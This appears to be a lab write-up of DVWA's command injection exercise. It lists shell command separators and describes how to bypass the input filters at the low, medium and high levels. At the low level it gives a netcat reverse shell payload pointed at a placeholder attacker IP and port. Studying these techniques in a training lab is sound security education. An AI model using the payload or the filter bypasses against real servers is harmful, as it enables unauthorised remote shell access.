# DVWA - Command Injection Solution

## Low level
> Because it doesn't filter the input text, so we can use the injection to get more information form the server.

|command|descripes|
|-|-|
|;|Can do the command behind ';'|
|&&|After the first command successful do the second|
|\|\||After the first command failure do the second|

> Usw the ';'
> 
> ![](https://i.imgur.com/iYsY42z.png)

> Usw the '&&'
> 
> ![](https://i.imgur.com/ZZYTz6Z.png)

> We can use the `; nc -e /bin/sh [ip] [port]` to connect to the server.
> We need to listen the port on our server and use the command injection to cennect.
> ![](https://i.imgur.com/FZLyZTJ.png)

## Medium level
> We can see the source code, it will filter the ';' and '&&'. So we can use '&;&' to bypass.

![](https://i.imgur.com/zpjKHp6.png)

> Or we can use the '||', '|' to bypass.
> ![](https://i.imgur.com/hdRWPMf.png)


## High level
> As we can see there is a 'space' after '|' so we can use the '|' to bypass. 
> ![](https://i.imgur.com/WNdJmM2.png)


> Example
> 
> ![](https://i.imgur.com/hEhzki6.png)

## Impossibel level 
> In this case we can see the source code.
> It split the input by '.' and check the input.
> If the input isn't a number it will echo 'ERROR: You have entered an invalid IP.'
> So we don't have the way to bypass.
> ![](https://i.imgur.com/u7ieCLz.png)
